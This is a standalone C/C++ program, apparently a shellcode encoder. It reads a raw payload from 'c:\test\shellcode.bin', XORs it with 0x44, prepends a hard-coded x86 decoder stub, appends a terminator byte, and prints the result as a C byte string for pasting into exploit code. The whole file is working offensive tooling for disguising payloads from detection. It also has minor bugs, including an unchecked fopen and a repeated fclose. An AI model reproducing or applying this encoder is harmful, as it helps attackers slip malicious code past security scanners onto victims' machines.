#include <windows.h>
size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}
unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}
int main(int argc, char* argv[])
{
	char *szFilePath="c:\\test\\shellcode.bin";
	char *szFilePath2="c:\\test\\shellcode2.bin";
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &size);
	for(int i=0;i<size;i++)
	{
		BinData[i]=BinData[i]^0x44;
	}
	FILE* f = NULL;
	f = fopen(szFilePath2, "wb");
	if (f == NULL)
	{
		printf("Create error\n");
		return 0;
	}
	char decode[]="\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1";
	char end[]="\xD5";
	fwrite(decode,20,1,f);
	fwrite(BinData,size,1,f);
	fwrite(end,1,1,f);
	fclose(f);	
	f = fopen(szFilePath2, "rb");
	if (f == NULL)
	{
		printf("Create error\n");
		return 0;
	}
	unsigned char *BinData2 = NULL;
	size_t size2 = 0;	
	BinData2 = ReadBinaryFile(szFilePath2, &size2);
	printf("\"");
	for (int j=0;j<size2;j++)
	{
		printf("\\x%02x",BinData2[j]);
		if((j+1)%16==0)
			printf("\"\n\"");
	}
	printf("\"");
	fclose(f);
	return 0;
}
